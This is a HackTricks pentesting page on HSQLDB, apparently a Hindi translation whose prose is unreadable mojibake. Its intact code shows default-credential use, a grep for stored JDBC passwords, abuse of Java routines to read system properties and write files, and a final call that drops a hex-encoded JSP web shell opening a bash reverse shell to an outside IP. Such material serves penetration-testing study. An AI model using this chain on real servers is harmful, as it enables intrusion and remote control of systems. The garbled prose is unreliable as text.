{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# Basic Information

**HSQLDB \([HyperSQL DataBase](http://hsqldb.org/)\)** рдПрдХ рдкреНрд░рдореБрдЦ SQL рд░рд┐рд▓реЗрд╢рдирд▓ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕рд┐рд╕реНрдЯрдо рд╣реИ рдЬреЛ Java рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рдПрдХ рдЫреЛрдЯрд╛, рддреЗрдЬ рдорд▓реНрдЯреАрдереНрд░реЗрдбреЗрдб рдФрд░ рдЯреНрд░рд╛рдВрдЬреИрдХреНрд╢рдирд▓ рдбреЗрдЯрд╛рдмреЗрд╕ рдЗрдВрдЬрди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЗрди-рдореЗрдореЛрд░реА рдФрд░ рдбрд┐рд╕реНрдХ-рдЖрдзрд╛рд░рд┐рдд рдЯреЗрдмрд▓ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдПрдореНрдмреЗрдбреЗрдб рдФрд░ рд╕рд░реНрд╡рд░ рдореЛрдб рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 9001
```text
9001/tcp open  jdbc      HSQLDB JDBC (Network Compatibility Version 2.3.4.0)
```
# Information

### Default Settings

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ рд╕реЗрд╡рд╛ рд╕рдВрднрд╡рддрдГ рдореЗрдореЛрд░реА рдореЗрдВ рдЪрд▓ рд░рд╣реА рд╣реИ рдпрд╛ рд▓реЛрдХрд▓рд╣реЛрд╕реНрдЯ рд╕реЗ рдмрдВрдзреА рд╣реБрдИ рд╣реИред рдпрджрд┐ рдЖрдкрдиреЗ рдЗрд╕реЗ рдкрд╛рдпрд╛ рд╣реИ, рддреЛ рдЖрдкрдиреЗ рд╕рдВрднрд╡рддрдГ рдХрд┐рд╕реА рдЕрдиреНрдп рд╕реЗрд╡рд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рд╣реИ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЖрдорддреМрд░ рдкрд░ `sa` рд╣реЛрддреЗ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЦрд╛рд▓реА рд╣реЛрддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдкрдиреЗ рдХрд┐рд╕реА рдЕрдиреНрдп рд╕реЗрд╡рд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рд╣реИ, рддреЛ рд╕рдВрднрд╛рд╡рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВред
```text
grep -rP 'jdbc:hsqldb.*password.*' /path/to/search
```
рдзреНрдпрд╛рди рд╕реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдирд╛рдо рдиреЛрдЯ рдХрд░реЗрдВ - рдЖрдкрдХреЛ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

# рдЬрд╛рдирдХрд╛рд░реА рдЗрдХрдЯреНрдард╛ рдХрд░рдирд╛

DB рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ [HSQLDB рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдХреЗ](https://sourceforge.net/projects/hsqldb/files/) рдФрд░ `hsqldb/lib/hsqldb.jar` рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВред GUI рдРрдк \(eww\) рдХреЛ `java -jar hsqldb.jar` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЪрд▓рд╛рдПрдВ рдФрд░ рдЦреЛрдЬреЗ рдЧрдП/рдХрдордЬреЛрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдиреЗрдХреНрд╢рди URL рдПрдХ рджреВрд░рд╕реНрде рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧрд╛: `jdbc:hsqldb:hsql://ip/DBNAME`ред

# рддрд░рдХреАрдмреЗрдВ

## рдЬрд╛рд╡рд╛ рднрд╛рд╖рд╛ рд░реВрдЯреАрди

рд╣рдо HSQLDB рд╕реЗ рдЬрд╛рд╡рд╛ рднрд╛рд╖рд╛ рд░реВрдЯреАрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЬрд╛рд╡рд╛ рдХреНрд▓рд╛рд╕ рдХреЗ рд╕реНрдерд┐рд░ рддрд░реАрдХреЛрдВ рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЙрд▓ рдХреА рдЧрдИ рдХреНрд▓рд╛рд╕ рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдХреНрд▓рд╛рд╕рдкрд╛рде рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

JRTs `functions` рдпрд╛ `procedures` рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЬрд╛рд╡рд╛ рд╡рд┐рдзрд┐ рдПрдХ рдпрд╛ рдЕрдзрд┐рдХ SQL-рд╕рдВрдЧрдд рдкреНрд░рд╛рдЗрдорд┐рдЯрд┐рд╡ рд╡реЗрд░рд┐рдПрдмрд▓ рд▓реМрдЯрд╛рддреА рд╣реИ, рддреЛ рдЙрдиреНрд╣реЗрдВ SQL рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрдиреНрд╣реЗрдВ `VALUES` рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрджрд┐ рдЬрд╛рд╡рд╛ рд╡рд┐рдзрд┐ рдЬрд┐рд╕реЗ рд╣рдо рдХреЙрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, void рд▓реМрдЯрд╛рддреА рд╣реИ, рддреЛ рд╣рдореЗрдВ `CALL` рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ рдХреЗ рд╕рд╛рде рд▓рд╛рдЧреВ рдХреА рдЧрдИ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

## рдЬрд╛рд╡рд╛ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рдкрдврд╝рдирд╛

рдлрдВрдХреНрд╢рди рдмрдирд╛рдПрдВ:
```text
CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
```
рдХрд╛рд░реНрдп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:
```text
VALUES(getsystemproperty('user.name'))
```
рдЖрдк [рдпрд╣рд╛рдБ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рдХреА рд╕реВрдЪреА](https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

## рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рд▓рд┐рдЦреЗрдВ

рдЖрдк `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename` рдЬрд╛рд╡рд╛ рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ JDK рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ \(рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдХреНрд▓рд╛рд╕ рдкрд╛рде рдореЗрдВ рдСрдЯреЛ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ\) рдХрд╕реНрдЯрдо рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд┐рд╕реНрдХ рдкрд░ рд╣реЗрдХреНрд╕-рдХреЛрдбреЗрдб рдЖрдЗрдЯрдо рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдПред **1024 рдмрд╛рдЗрдЯреНрд╕ рдХрд╛ рдЕрдзрд┐рдХрддрдо рдЖрдХрд╛рд░ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦреЗрдВ**ред

рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдПрдВ:
```text
CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```
рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:
```text
call writetofile('/path/ROOT/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3131392[...]' AS VARBINARY(1024)))
```
{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
